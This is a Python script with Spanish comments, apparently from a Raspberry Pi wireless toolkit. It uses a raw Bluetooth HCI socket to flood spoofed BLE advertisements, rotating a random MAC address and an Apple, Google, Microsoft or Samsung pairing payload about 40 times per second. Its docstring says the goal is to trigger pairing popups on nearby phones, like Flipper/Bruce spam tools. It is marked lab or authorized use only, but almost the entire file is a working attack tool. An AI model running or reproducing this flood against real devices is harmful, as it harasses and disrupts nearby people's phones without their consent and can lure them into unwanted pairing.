#!/usr/bin/env python3
"""ble_adv_fast.py - Advertiser BLE de ALTA TASA via socket HCI crudo (root).

Por que existe: el loop viejo hacia fork(hcitool) por comando (~5 forks/ciclo
con sudo) -> ~1-2 adverts/seg. A esa tasa el flood NO dispara los popups de
proximity-pairing en los telefonos, aunque el payload sea correcto. Bruce/
Flipper rotan MAC+payload decenas de veces por segundo con su stack nativo.

Esto abre UN socket HCI persistente y rota MAC+payload cada ~rotate_ms (~40/s),
igualando a Bruce. Reusa exactamente los payloads de bt_ops (apple/google/
microsoft/samsung/names/random). Corre como root (el socket HCI lo exige) y se
invoca via `sudo -n python3 ble_adv_fast.py <iface> <seconds> <mode>`.

Imprime UN JSON al terminar (mismo contrato que bt_ops). SOLO lab / autorizado.
"""
import socket
import struct
import sys
import os
import time
import json
import random

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import bt_ops as B  # reusa builders de payload y _random_static_address

# Nivel/opcion para el filtro HCI (no queremos recibir eventos: solo enviamos).
SOL_HCI = 0
HCI_FILTER = 2

# adv_type por modo: conectable (0x00) para Fast Pair/Swift Pair/Samsung (el SO
# ofrece emparejar); no-conectable (0x03) para Apple Continuity.
_ADV_TYPE = {
    "apple": 0x03, "google": 0x00, "microsoft": 0x00, "samsung": 0x00,
    "names": 0x00, "random": 0x00,
}


def _mk_socket(dev_index):
    s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
    s.bind((dev_index,))
    # Intentar filtrar eventos (best-effort). El tamano del struct hci_filter
    # varia segun kernel y un setsockopt con tamano erroneo da EINVAL; si falla
    # no pasa nada: drenamos el RX en el loop (_drain). No debe tumbar el bind.
    try:
        s.setsockopt(SOL_HCI, HCI_FILTER, struct.pack("<LLLH", 0, 0, 0, 0))
    except Exception:
        pass
    return s


def _drain(s):
    """Vacia el buffer RX del socket (eventos HCI que no nos interesan) para que
    no se llene en corridas largas. No bloquea (MSG_DONTWAIT)."""
    for _ in range(64):
        try:
            if not s.recv(1024, socket.MSG_DONTWAIT):
                break
        except (BlockingIOError, OSError):
            break


def _cmd(s, ogf, ocf, data=b""):
    op = (ogf << 10) | ocf
    s.send(struct.pack("<BHB", 0x01, op, len(data)) + bytes(data))


def _payload_for(mode, names, idx):
    if mode == "apple":
        return B._build_apple_payload()
    if mode == "google":
        return B._build_google_payload()
    if mode == "microsoft":
        return B._build_microsoft_payload()
    if mode == "samsung":
        return B._build_samsung_buds_payload()
    if mode == "random":
        return B._build_adv_payload({"name": "Dev-%04x" % random.randint(0, 0xFFFF),
                                     "cid": None, "data": b""})
    # names
    n = names[idx % len(names)] if names else "Piscan"
    return B._build_adv_payload({"name": n, "cid": None, "data": b""})


def main():
    if len(sys.argv) < 2:
        print(json.dumps({"ok": False, "error": "uso: ble_adv_fast.py <iface> [seconds] [mode] [rotate_ms]"}))
        return 1
    iface = sys.argv[1]
    try:
        dev = int(iface.replace("hci", ""))
    except Exception:
        print(json.dumps({"ok": False, "error": f"iface invalido: {iface}"}))
        return 1
    seconds = int(sys.argv[2]) if len(sys.argv) > 2 and sys.argv[2].isdigit() else 20
    seconds = max(2, min(seconds, 300))
    mode = (sys.argv[3] if len(sys.argv) > 3 else "names").lower()
    rotate_ms = int(sys.argv[4]) if len(sys.argv) > 4 and sys.argv[4].isdigit() else 25
    rotate_ms = max(10, min(rotate_ms, 500))

    adv_type = _ADV_TYPE.get(mode, 0x00)
    names = B._load_ble_names() if mode == "names" else []

    try:
        s = _mk_socket(dev)
    except Exception as e:
        print(json.dumps({"ok": False, "error": f"socket HCI fallo (root? iface?): {e}"}))
        return 1

    # Parametros de advertising: intervalo rapido (0x20 = 20ms min/max),
    # own_addr_type=random (0x01), 3 canales. adv_type segun modo.
    params = bytes([0x20, 0x00, 0x20, 0x00, adv_type, 0x01,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00])
    cycles = 0
    last_name = ""
    t_end = time.time() + seconds
    try:
        _cmd(s, 0x08, 0x000A, [0x00])          # disable (limpia)
        _cmd(s, 0x08, 0x0006, params)          # set params
        while time.time() < t_end:
            payload = _payload_for(mode, names, cycles)
            if not payload:
                continue
            addr = B._random_static_address()  # 6 bytes LE, static random
            data = bytes([len(payload)]) + bytes(payload) + bytes(31 - len(payload))
            # MAC nueva cada ciclo => "device nuevo" para el telefono. Cambiar la
            # random address exige advertising OFF, por eso el ciclo es
            # disable -> set-addr -> set-data -> enable.
            _cmd(s, 0x08, 0x000A, [0x00])
            _cmd(s, 0x08, 0x0005, addr)
            _cmd(s, 0x08, 0x0008, data)
            _cmd(s, 0x08, 0x000A, [0x01])
            cycles += 1
            _drain(s)
            time.sleep(rotate_ms / 1000.0)
        _cmd(s, 0x08, 0x000A, [0x00])          # teardown
    except Exception as e:
        try:
            _cmd(s, 0x08, 0x000A, [0x00])
        except Exception:
            pass
        print(json.dumps({"ok": cycles > 0, "iface": iface, "mode": mode,
                           "seconds": seconds, "cycles": cycles,
                           "error": f"loop: {e}"}))
        return 0
    finally:
        try:
            s.close()
        except Exception:
            pass

    rate = round(cycles / float(seconds), 1)
    print(json.dumps({"ok": cycles > 0, "iface": iface, "mode": mode,
                      "seconds": seconds, "cycles": cycles, "rate": rate,
                      "last_name": last_name}))
    return 0


if __name__ == "__main__":
    sys.exit(main())
